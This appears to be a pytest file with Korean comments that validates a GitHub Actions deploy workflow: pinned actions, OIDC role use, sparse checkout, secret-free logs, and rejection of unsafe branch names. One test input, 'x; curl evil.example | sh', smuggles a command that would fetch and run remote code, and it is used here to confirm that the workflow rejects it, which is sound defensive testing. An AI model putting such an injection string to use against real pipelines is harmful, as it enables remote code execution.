    assert "environment" not in job
    assert job["if"] == "github.ref == 'refs/heads/main'"
    assert job["permissions"] == {"id-token": "write", "contents": "read"}
    assert job["runs-on"] == "ubuntu-latest" and job["timeout-minutes"] == 60

    steps = job["steps"]
    checkouts = {
        s["with"]["path"]: s for s in steps if str(s.get("uses", "")).startswith("actions/checkout")
    }
    assert set(checkouts) == {"talkto_api_server", "TalkTo_PersonaAI_AI", "TalkTo_PersonaAI_FE"}
    for path, step in checkouts.items():
        assert step["with"]["repository"] == f"MediLux-TalkTo/{path}"
        assert step["with"]["fetch-depth"] == 1
        assert step["with"]["persist-credentials"] is False
        assert step["with"]["ssh-key"].startswith("${{ secrets.")
    # 세 폴더가 deploy.py 가 찾는 자리(BE 옆에 AI·FE)
    assert deploy.AI.name == "TalkTo_PersonaAI_AI" and deploy.FE.name == "TalkTo_PersonaAI_FE"

    ai = checkouts["TalkTo_PersonaAI_AI"]["with"]
    assert ai["sparse-checkout-cone-mode"] is False
    assert ai["filter"] == "blob:none"
    patterns = [p.strip() for p in ai["sparse-checkout"].splitlines() if p.strip()]
    assert all(
        p.startswith("/") for p in patterns
    )  # 레포 맨 위의 그 이름만(아래 폴더의 같은 이름 X)
    assert [p.strip("/") for p in patterns] == deploy.AI_INCLUDE
    assert "!" not in ai["sparse-checkout"] and "*" not in ai["sparse-checkout"]
    assert "server" in checkouts["TalkTo_PersonaAI_FE"]["if"]

    run_step = next(s for s in steps if "deploy.py" in str(s.get("run", "")))
    assert run_step["env"]["TALKTO_CI"] == "1"
    assert run_step["env"]["GIT_NO_LAZY_FETCH"] == "1"
    assert (
        run_step["env"]["DISCORD_DEPLOY_WEBHOOK_URL"] == "${{ secrets.DISCORD_DEPLOY_WEBHOOK_URL }}"
    )
    assert run_step["run"].strip() == 'python talkto_api_server/deploy/aws/deploy.py "$TARGET"'
    aws = next(s for s in steps if str(s.get("uses", "")).startswith("aws-actions/"))
    assert aws["with"]["role-to-assume"] == "${{ vars.AWS_DEPLOY_ROLE_ARN }}"
    assert aws["with"]["aws-region"] == "ap-northeast-2"
    # 남이 만든 액션은 커밋으로 고정
    for step in steps:
        uses = str(step.get("uses", ""))
        if uses and not uses.startswith(("actions/", "aws-actions/")):
            assert len(uses.split("@")[1]) == 40, uses
    # 입력 확인이 맨 앞이고, 요약은 입력 확인이 통과했을 때만
    assert steps[0]["id"] == "check" and "REF" in steps[0]["env"]
    assert "steps.check.outcome == 'success'" in steps[-1]["if"]


def test_workflow_never_interpolates_into_scripts():
    """${{ }} 를 run: 에 바로 넣으면 입력(브랜치 이름)으로 명령을 끼워 넣을 수 있다.
    env 로만 넘긴다."""
    wf = _workflow()
    (job,) = wf["jobs"].values()
    scripts = [s["run"] for s in job["steps"] if "run" in s]
    assert scripts
    for script in scripts:
        assert "${{" not in script, script


def _bash() -> str | None:
    """GitHub 처럼 bash 로 돌린다. 윈도우는 Git 의 bash(System32 의 WSL bash 는 쓰지 않는다)."""
    git = shutil.which("git")
    if git:
        for cand in (
            Path(git).parents[1] / "bin" / "bash.exe",
            Path(git).parents[1] / "usr" / "bin" / "bash.exe",
        ):
            if cand.exists():
                return str(cand)
    found = shutil.which("bash")
    return found if found and "system32" not in found.lower() else None


@pytest.mark.skipif(_bash() is None, reason="bash 가 없어요")
@pytest.mark.parametrize(
    ("ref", "ok"),
    [
        ("feat/persona-builder", True),
        ("main", True),
        ("release-1.2", True),
        ("a" * 100, True),
        ("a" * 101, False),
        ("x; curl evil.example | sh", False),
        ("$(id)", False),
        ("feat/../main", False),
        ("-main", False),
        ("feat//x", False),
        ("feat/", False),
        ("x.lock", False),
        ("", False),
        ("한글", False),
    ],
)
def test_workflow_ref_check(ref, ok, tmp_path):
    wf = _workflow()
    (job,) = wf["jobs"].values()
    script = job["steps"][0]["run"]
    env = {**deploy.os.environ, "TARGET": "server", "REF": ref}
    r = subprocess.run(
        [_bash(), "--noprofile", "--norc", "-eo", "pipefail", "-s"],
        input=script.encode("utf-8"),
        env=env,
        capture_output=True,
    )
    assert (r.returncode == 0) is ok, r.stdout + r.stderr


def _step(name_part: str) -> dict:
    (job,) = _workflow()["jobs"].values()
    return next(s for s in job["steps"] if name_part in s.get("name", ""))


class _TokenServer(BaseHTTPRequestHandler):
    """GitHub 의 OIDC 토큰 주소 흉내. 받은 요청을 기록한다."""

    seen: list[tuple[str, str]] = []
    token = ""

    def do_GET(self):  # noqa: N802
        type(self).seen.append((self.path, self.headers.get("Authorization", "")))
        body = json.dumps({"value": type(self).token}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def test_workflow_shows_the_token_subject_when_aws_refuses():
    """AWS 가 역할을 안 주면(sub 불일치) GitHub 가 보낸 sub 만 보여 준다. 토큰은 찍지 않는다."""
    step = _step("실패 원인")
    assert step["if"] == "failure() && steps.aws.outcome == 'failure'"
    assert _step("AWS 권한 받기")["id"] == "aws"
    script = step["run"]
    code = script.split("<<'PY'\n", 1)[1].rsplit("PY", 1)[0]

    def b64(data: dict) -> str:
        return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

    token = f"{b64({'alg': 'RS256'})}.{b64({'sub': SUB, 'aud': 'sts.amazonaws.com'})}.sig-SECRET"
    _TokenServer.seen, _TokenServer.token = [], token
    server = HTTPServer(("127.0.0.1", 0), _TokenServer)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        env = {k: v for k, v in deploy.os.environ.items() if "proxy" not in k.lower()}
        env.update(
            ACTIONS_ID_TOKEN_REQUEST_URL=f"http://127.0.0.1:{server.server_port}/t?api-version=2.0",
            ACTIONS_ID_TOKEN_REQUEST_TOKEN="request-SECRET",
            NO_PROXY="*",
        )
        # GitHub 러너(리눅스)처럼 UTF-8 로 찍는다(-I 는 PYTHONIOENCODING 을 안 본다)
        r = subprocess.run(
            [sys.executable, "-I", "-X", "utf8", "-"],
            input=code.encode(),
            env=env,
            capture_output=True,
        )
    finally:
        server.shutdown()
    out = r.stdout.decode("utf-8") + r.stderr.decode("utf-8")
    assert r.returncode == 0, out
    assert f"::error::GitHub 가 보낸 sub: {SUB}" in out
    assert "SECRET" not in out and token not in out
    assert _TokenServer.seen == [
        ("/t?api-version=2.0&audience=sts.amazonaws.com", "Bearer request-SECRET")
    ]


@pytest.mark.skipif(_bash() is None, reason="bash 가 없어요")
@pytest.mark.parametrize(("triggering", "who"), [("alexamy", "alexamy"), ("", "Loda1002")])
def test_workflow_summary_names_who_ran_it(tmp_path, triggering, who):
    summary = tmp_path / "summary.md"
    env = {
        **deploy.os.environ,
        "TARGET": "server",
        "REF": "feat/persona-builder",
        "FORCE": "",
        "RESULT": "success",
        "GITHUB_ACTOR": "Loda1002",
        "GITHUB_TRIGGERING_ACTOR": triggering,
        "GITHUB_STEP_SUMMARY": str(summary),
    }
    r = subprocess.run(
        [_bash(), "--noprofile", "--norc", "-eo", "pipefail", "-s"],
        input=_step("요약")["run"].encode("utf-8"),
        env=env,
        capture_output=True,
    )
    assert r.returncode == 0, r.stdout + r.stderr
    line = summary.read_text(encoding="utf-8")
    assert "server" in line and "feat/persona-builder" in line
    assert f"· {who} " in line


def test_workflow_target_check():
    wf = _workflow()
    (job,) = wf["jobs"].values()
    script = job["steps"][0]["run"]
    assert all(f"{s}|" in script or f"|{s})" in script for s in deploy.CI_STEPS)


# ── 부분 체크아웃(AI 레포) ───────────────────────────────
@pytest.mark.skipif(shutil.which("git") is None, reason="git 이 없어요")
def test_pack_and_commits_work_in_a_sparse_partial_clone(tmp_path, monkeypatch, capsys):
    """GitHub 의 AI 체크아웃처럼(blob:none·depth 1·non-cone sparse) 받은 곳에서도 묶음·커밋 표시가
    되고, 받지 않은 파일(가족 녹음)의 내용은 끝까지 받아 오지 않는다."""

    def git(*args, cwd=None, check=True):
        return subprocess.run(
            [
                "git",
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@t",
                "-c",
                "core.autocrlf=false",
                *args,
            ],
            cwd=cwd,
            capture_output=True,
            text=True,
            check=check,
        )

    src = tmp_path / "src"
    (src / "infra").mkdir(parents=True)
    (src / "input").mkdir()
    (src / ".gitignore").write_text("*.log\n", encoding="utf-8")
    (src / "Dockerfile").write_text("FROM python\n", encoding="utf-8")
    (src / "infra" / "a.py").write_text("A = 1\n", encoding="utf-8")
    (src / "input" / "family.wav").write_bytes(b"RIFF-family")
    git("init", "-q", "-b", "main", str(src))
    git("add", "-A", cwd=src)
    git("commit", "-qm", "init", cwd=src)
    git("config", "uploadpack.allowFilter", "true", cwd=src)

    dst = tmp_path / "TalkTo_PersonaAI_AI"
    try:
        git(
            "clone",
            "-q",
            "--filter=blob:none",
            "--no-checkout",
            "--depth",
            "1",
            src.as_uri(),
            str(dst),
        )
    except subprocess.CalledProcessError as error:
        pytest.skip(f"이 git 은 부분 복제를 못 해요: {error.stderr}")
    git("sparse-checkout", "set", "--no-cone", "/Dockerfile", "/infra/", cwd=dst)
    git("config", "core.autocrlf", "false", cwd=dst)
    git("checkout", "-q", "--force", "-B", "main", "origin/main", cwd=dst)
    git("remote", "set-url", "origin", str(tmp_path / "gone"), cwd=dst)  # 열쇠를 치운 뒤처럼
    (dst / "infra" / "new.py").write_text("B = 2\n", encoding="utf-8")
    assert not (dst / "input").exists()

    data = deploy.pack(dst, ["Dockerfile", "infra"])
    with tarfile.open(fileobj=io.BytesIO(data), mode="r:gz") as tar:
        names = sorted(tar.getnames())
    assert names == ["Dockerfile", "infra/a.py", "infra/new.py"]
    assert "확인하지 못했어요" not in capsys.readouterr().out

    family = git("ls-tree", "HEAD", "input/family.wav", cwd=dst).stdout.split()[2]
    probe = subprocess.run(
        ["git", "cat-file", "-e", family],
        cwd=dst,
        capture_output=True,
        env={**deploy.os.environ, "GIT_NO_LAZY_FETCH": "1"},
    )
    assert probe.returncode != 0  # 가족 녹음 내용은 받지 않았다

    head = git("rev-parse", "--short", "HEAD", cwd=dst).stdout.strip()
    monkeypatch.setattr(deploy, "BE", dst)
    monkeypatch.setattr(deploy, "AI", dst)
    monkeypatch.setattr(deploy, "FE", tmp_path / "no-fe")  # server 만 올릴 땐 FE 를 받지 않는다
    assert deploy.commits() == f"BE {head} · AI {head}"


def test_ci_include_lists_have_no_family_paths():
    for name in deploy.AI_INCLUDE:
        assert name not in deploy.SKIP_PARTS
        assert "/" not in name and "*" not in name
    assert deploy.CI_STEPS == ("server", "web", "landing", "app")
